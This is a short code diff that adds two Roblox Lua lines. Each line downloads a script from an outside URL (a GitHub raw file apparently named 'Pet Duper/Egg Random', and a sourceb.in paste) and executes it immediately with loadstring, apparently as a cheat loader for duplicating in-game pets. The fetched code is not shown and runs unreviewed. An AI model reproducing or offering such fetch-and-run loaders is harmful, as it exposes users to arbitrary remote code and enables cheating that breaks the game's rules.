@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Pet%20Duper/Egg%20Random"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/AwPg9oAwaK/0", true))()
